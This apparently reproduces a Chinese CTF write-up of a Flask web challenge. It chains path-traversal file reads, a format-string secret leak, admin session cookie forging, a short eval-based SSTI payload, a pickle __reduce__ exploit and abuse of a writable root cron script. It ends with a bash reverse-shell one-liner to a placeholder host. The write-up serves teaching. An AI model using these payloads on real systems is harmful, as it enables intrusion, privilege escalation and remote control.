@@ -1,0 +1,205 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p><strong>前言</strong><br/>
+该题是2023春秋杯冬季赛web的一道题，我们拿到pickle反序列化漏洞时的一般思路是通过重写reduce方法达到rce,当过滤多且对字符数量有限制，似乎手写opcode不能破局，笔者通过做了该题，认识到渲染模板的危害和精妙，故将此文件分享给大家，如有不对，大家多多指教。</p>
+<p><strong>考点</strong><br/>
+披着php皮的python加任意文件读取加格式化字符串泄露key加session伪造加文件上传加Python原生反序列化命令执行加渲染模板加赋权</p>
+<p><strong>攻击</strong><br/>
+打开靶机访问<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520143654-5901380c-1673-1.webp"/><br/>
+又是个登录框 今天看别的wp看见了一句话 贴下下<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520143750-7a5bc4ae-1673-1.webp"/><br/>
+看到login,很容易猜到register是否存在<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520143814-88efa832-1673-1.webp"/><br/>
+发现存在，那我们先注册一下<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520143833-93ffcdec-1673-1.webp"/><br/>
+返回了用户名和密码的哈希（我这里注册是密码是1）即1的哈希<br/>
+登陆后我习惯看一眼cookie 看看是否有session之类的认证<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520143843-9a66a728-1673-1.webp"/><br/>
+还真有<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520143852-9f944c3c-1673-1.webp"/><br/>
+返回个这个 点击发现是个文件上传的功能<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520143905-a7169b04-1673-1.webp"/><br/>
+常规思路上传php文件getshell啥的，<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520143931-b700d4f8-1673-1.webp"/><br/>
+发现给我们跳转到了pic.php我们点击一下<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144014-d088ac8e-1673-1.webp"/><br/>
+发现base64 且给我们转成了img标签格式<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144033-db6a501c-1673-1.webp"/><br/>
+解码发现是我们上传的内容,这里我们可以想到pic.php通过pic参数接受文件，然后读取文件内容并给我们转成Base64输出，我们猜测很可能存在任意文件读取漏洞<br/>
+我们试着通过路径穿越去读/etc/passwd<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144048-e46fd056-1673-1.webp"/><br/>
+读不到 我们试一下双写绕过<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144114-f469f8b0-1673-1.webp"/><br/>
+得到了 我们进行解码<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144127-fba2fa64-1673-1.webp"/><br/>
+发现存在漏洞 我们在读取一些常见的比如<br/>
+获取当前进程环境变量/proc/self/environ,获取当前启动进程/proc/self/cmdline<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144147-079d9c52-1674-1.webp"/><br/>
+这下可以确实是python服务<br/>
+尝试读app.py 一般在app目录下<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144206-12e502d0-1674-1.webp"/><br/>
+解码得</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pickle</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">session</span><span class="p">,</span><span class="n">render_template</span><span class="p">,</span><span class="n">redirect</span>
+<span class="kn">from</span> <span class="nn">Users</span> <span class="kn">import</span> <span class="n">Users</span>
+<span class="kn">from</span> <span class="nn">waf</span> <span class="kn">import</span> <span class="n">waf</span>
+
+<span class="n">users</span><span class="o">=</span><span class="n">Users</span><span class="p">()</span>
+
+<span class="n">app</span><span class="o">=</span><span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+<span class="n">app</span><span class="o">.</span><span class="n">template_folder</span><span class="o">=</span><span class="s2">"./"</span>
+<span class="n">app</span><span class="o">.</span><span class="n">secret_key</span><span class="o">=</span><span class="n">users</span><span class="o">.</span><span class="n">passwords</span><span class="p">[</span><span class="s1">'admin'</span><span class="p">]</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/index.php'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s2">"login.php"</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span><span class="o">==</span><span class="s2">"POST"</span> <span class="ow">and</span> <span class="s1">'file'</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span> <span class="ow">and</span> <span class="p">(</span><span class="n">filename</span><span class="p">:</span><span class="o">=</span><span class="n">waf</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">'file'</span><span class="p">])):</span>
+        <span class="n">filepath</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s2">"./uploads"</span><span class="p">,</span><span class="n">filename</span><span class="p">)</span>
+        <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">filepath</span><span class="p">)</span>
+        <span class="k">return</span> <span class="s2">"File upload success! Path: &lt;a href='pic.php?pic="</span><span class="o">+</span><span class="n">filename</span><span class="o">+</span><span class="s2">"'&gt;"</span><span class="o">+</span><span class="n">filepath</span><span class="o">+</span><span class="s2">"&lt;/a&gt;."</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">"index.html"</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/login.php'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span><span class="o">==</span><span class="s2">"POST"</span> <span class="ow">and</span> <span class="p">(</span><span class="n">username</span><span class="p">:</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">))</span> <span class="ow">and</span> <span class="p">(</span><span class="n">password</span><span class="p">:</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'password'</span><span class="p">)):</span>
+        <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="o">==</span><span class="nb">str</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">==</span><span class="nb">str</span> <span class="ow">and</span> <span class="n">users</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">):</span>
+            <span class="n">session</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]</span><span class="o">=</span><span class="n">username</span>
+            <span class="k">return</span> <span class="s2">"Login success! &lt;a href='/'&gt;Click here to redirect.&lt;/a&gt;"</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">"Login fail!"</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">"login.html"</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/register.php'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span><span class="o">==</span><span class="s2">"POST"</span> <span class="ow">and</span> <span class="p">(</span><span class="n">username</span><span class="p">:</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">))</span> <span class="ow">and</span> <span class="p">(</span><span class="n">password</span><span class="p">:</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'password'</span><span class="p">)):</span>
+        <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="o">==</span><span class="nb">str</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">==</span><span class="nb">str</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">username</span><span class="o">.</span><span class="n">isnumeric</span><span class="p">()</span> <span class="ow">and</span> <span class="n">users</span><span class="o">.</span><span class="n">register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">):</span>
+            <span class="n">str1</span> <span class="o">=</span> <span class="s2">"Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}."</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">users</span><span class="o">=</span><span class="n">users</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">str1</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s2">"Register fail!"</span>
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">"register.html"</span><span class="p">)</span>
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/pic.php'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">pic</span><span class="p">():</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s2">"login.php"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">pic</span><span class="p">:</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'pic'</span><span class="p">))</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filepath</span><span class="p">:</span><span class="o">=</span><span class="s2">"./uploads/"</span><span class="o">+</span><span class="n">pic</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span><span class="s2">""</span><span class="p">)):</span>
+        <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span><span class="o">==</span><span class="s2">"admin"</span><span class="p">:</span>
+            <span class="k">return</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span><span class="s2">"rb"</span><span class="p">))</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="s1">'''&lt;img src="data:image/png;base64,'''</span><span class="o">+</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span><span class="s2">"rb"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">+</span><span class="s1">'''"&gt;'''</span>
+    <span class="n">res</span><span class="o">=</span><span class="s2">"&lt;h1&gt;files in ./uploads/&lt;/h1&gt;&lt;br&gt;"</span>
+    <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">"./uploads"</span><span class="p">):</span>
+        <span class="n">res</span><span class="o">+=</span><span class="s2">"&lt;a href='pic.php?pic="</span><span class="o">+</span><span class="n">f</span><span class="o">+</span><span class="s2">"'&gt;./uploads/"</span><span class="o">+</span><span class="n">f</span><span class="o">+</span><span class="s2">"&lt;/a&gt;&lt;br&gt;"</span>
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">80</span><span class="p">)</span>
+</pre></div>
+<p>顺便把waf.py Users.py读了</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">werkzeug.utils</span> <span class="kn">import</span> <span class="n">secure_filename</span>
+
+<span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">"./uploads"</span><span class="p">))</span><span class="o">&gt;=</span><span class="mi">4</span><span class="p">:</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">"rm -rf /app/uploads/*"</span><span class="p">)</span>
+
+    <span class="n">content</span><span class="o">=</span><span class="nb">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">70</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="p">[</span><span class="sa">b</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\r</span><span class="s2">"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"</span><span class="se">\\</span><span class="s2">"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"base"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"builtin"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"code"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"command"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"eval"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"exec"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"flag"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"global"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"os"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"output"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"popen"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"pty"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"repeat"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"run"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"setstate"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"spawn"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"subprocess"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"sys"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"system"</span><span class="p">,</span><span class="sa">b</span><span class="s2">"timeit"</span><span class="p">]:</span>
+        <span class="k">if</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="nb">file</span><span class="o">.</span><span class="n">seek</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">secure_filename</span><span class="p">(</span><span class="nb">file</span><span class="o">.</span><span class="n">filename</span><span class="p">)</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">hashlib</span>
+
+<span class="k">class</span> <span class="nc">Users</span><span class="p">:</span>
+    <span class="n">passwords</span><span class="o">=</span><span class="p">{}</span>
+
+    <span class="k">def</span> <span class="nf">register</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">passwords</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">False</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">passwords</span><span class="p">)</span><span class="o">&gt;=</span><span class="mi">3</span><span class="p">:</span>
+            <span class="k">for</span> <span class="n">u</span> <span class="ow">in</span> <span class="nb">list</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">passwords</span><span class="o">.</span><span class="n">keys</span><span class="p">()):</span>
+                <span class="k">if</span> <span class="n">u</span><span class="o">!=</span><span class="s2">"admin"</span><span class="p">:</span>
+                    <span class="k">del</span> <span class="bp">self</span><span class="o">.</span><span class="n">passwords</span><span class="p">[</span><span class="n">u</span><span class="p">]</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">passwords</span><span class="p">[</span><span class="n">username</span><span class="p">]</span><span class="o">=</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">True</span>
+
+    <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">username</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">passwords</span> <span class="ow">and</span> <span class="bp">self</span><span class="o">.</span><span class="n">passwords</span><span class="p">[</span><span class="n">username</span><span class="p">]</span><span class="o">==</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">():</span>
+            <span class="k">return</span> <span class="bp">True</span>
+        <span class="k">return</span> <span class="bp">False</span>
+</pre></div>
+<p>分析源码可得 首先得flask session伪造成admin ，<br/>
+app.secret_key=users.passwords['admin']=hashlib.md5(os.urandom(32)).hexdigest()<br/>
+key=admin密码的哈希值，那我们就要读admin的密码</p>
+<div class="highlight"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/register.php'</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span><span class="s1">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
+<span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="o">==</span><span class="nb">str</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">==</span><span class="nb">str</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">username</span><span class="o">.</span><span class="n">isnumeric</span><span class="p">()</span> <span class="ow">and</span> <span class="n">users</span><span class="o">.</span><span class="n">register</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">):</span>
+<span class="n">str1</span> <span class="o">=</span> <span class="s2">"Register successs! Your username is {username} with hash: {{users.passwords[{username}]}}."</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">users</span><span class="o">=</span><span class="n">users</span><span class="p">)</span>
+</pre></div>
+<p>这里存在格式化字符串漏洞<br/>
+p牛的文章<br/>
+<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a><br/>
+我们注册用户名位{users.passwords}能把所有用户名密码打印出来<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144229-20de9e64-1674-1.webp"/><br/>
+接下来flask解密</p>
+<p>python3 flask_session_cookie_manager3.py decode -c "eyJ1c2VybmFtZSI6ImEifQ.ZbJELw.ZQ5Ok16mtNrs7qbQbIfNSk7HjjA" -s "036197d2cb927e572ad60e67b7c5a95c"<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144303-350387ba-1674-1.webp"/><br/>
+成功 接下来伪造admin</p>
+<p>python3 flask_session_cookie_manager3.py encode -s "036197d2cb927e572ad60e67b7c5a95c" -t "{'username': 'admin'}"<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144324-41cdf5de-1674-1.webp"/><br/>
+接下来就是打pickle啦（本人做到这，后面不会了，我以为我就差一步了，没想到是万丈深渊）</p>
+<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="n">pic</span><span class="p">:</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'pic'</span><span class="p">))</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">filepath</span><span class="p">:</span><span class="o">=</span><span class="s2">"./uploads/"</span><span class="o">+</span><span class="n">pic</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span><span class="s2">""</span><span class="p">)):</span>
+<span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span><span class="o">==</span><span class="s2">"admin"</span><span class="p">:</span>
+<span class="k">return</span> <span class="n">pickle</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span><span class="s2">"rb"</span><span class="p">))</span>
+</pre></div>
+<p>会对我们上传的文件进行pickle的反序列化操作 但这里的waf可以说非常的多（换行回车也被过滤了） 且还有字符长度限制，一般常规思路的上传自己编写的opcode的思路是行不通，结合题目环境存在任意文件上传点，且最为关键的一点是设置了flask app的模板渲染路径为./（也就是/app）：这边考虑上传模板，经过模板渲染打SSTI</p>
+<p>app.template_folder="./"<br/>
+而我们上传文件的上传路径为./uploads/，所以我们上传的所有文件都可以被作为flask的模板文件进行渲染，同时Web源代码中也引入调用了render_template函数对模板文件进行渲染，审计代码不难推断出所有的模板文件都是存放在./也就是/app目录下的。那我们自然也可以按照这个思路通过任意文件上传点上传一个恶意的可以实现模板注入SSTI的POC模板文件，然后再通过pickle反序列化调用render_template函数渲染它即可实现pickle to SSTI的攻击思路。<br/>
+那我们首先需要构造一个长度不能达到70的SSTI payload，并且需要绕过waf函数的过滤，对于SSTI的攻击思路来说这样的过滤是比较好绕过的，因为字符串可以任意构造，长度的限制也可以使用lipsum构造一个短的SSTI注入，于是有payload：</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="p">[</span><span class="s1">'__glob''als__'</span><span class="p">][</span><span class="s1">'__built''ins__'</span><span class="p">][</span><span class="s1">'ev''al'</span><span class="p">](</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">)}}</span>
+</pre></div>
+<p>保存为poc文件后上传。继续构造pickle反序列化EXP：</p>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">pickle</span>
+<span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">render_template</span>
+
+<span class="k">class</span> <span class="nc">EXP</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">__reduce__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span><span class="p">(</span><span class="n">render_template</span><span class="p">,(</span><span class="s2">"uploads/poc"</span><span class="p">,))</span>
+
+<span class="n">exp</span><span class="o">=</span><span class="n">EXP</span><span class="p">()</span>
+<span class="n">f</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">"exp"</span><span class="p">,</span><span class="s2">"wb"</span><span class="p">)</span>
+<span class="n">pickle</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">exp</span><span class="p">,</span><span class="n">f</span><span class="p">)</span>
+</pre></div>
+<p>得到生成的exp文件上传（长度正好小于70），随后带上伪造好的admin用户的session打 (data处传参)<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144402-58175970-1674-1.webp"/><br/>
+ls / -al发现/flag权限为700而我们为ctf用户无法读取：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144419-62b4c57a-1674-1.webp"/><br/>
+cat /start.sh发现启动容器时root用户执行的命令脚本，其中会定期执行/app/clear.sh这个脚本清理上传的文件：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144515-84161a84-1674-1.webp"/><br/>
+ls -al发现clear.sh权限为766，我们作为ctf用户有修改的权限：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144537-90bf78e8-1674-1.webp"/><br/>
+那我们这里直接修改clear.sh脚本的内容然后等待就可以每10分钟以root用户身份权限执行一次命令了，这里直接写入：cat /flag &gt; flag到clear.sh<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144552-99ec4e32-1674-1.webp"/><br/>
+等待十分钟后 发现flag被写在当前目录了直接cat flag即可<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144607-a2c5f382-1674-1.webp"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520144633-b2005112-1674-1.webp"/><br/>
+或者反弹shell上线，避免上传的poc exp被删了<br/>
+<strong>import</strong>('os').popen('bash -c "bash -i &gt;&amp; /dev/tcp/x.x.x.x/9999 &lt;&amp;1"').read()<br/>
+其他操作就和上面大差不差了</p>
+<p><strong>总结</strong><br/>
+至此我们可以总结一下：该漏洞利用其实是存放模板的位置和我们pickle漏洞攻击的文件在同一目录下，再通过调用render_template函数渲染它，即可实现pickle to SSTI的攻击思路</p>
+</div>
+</div>
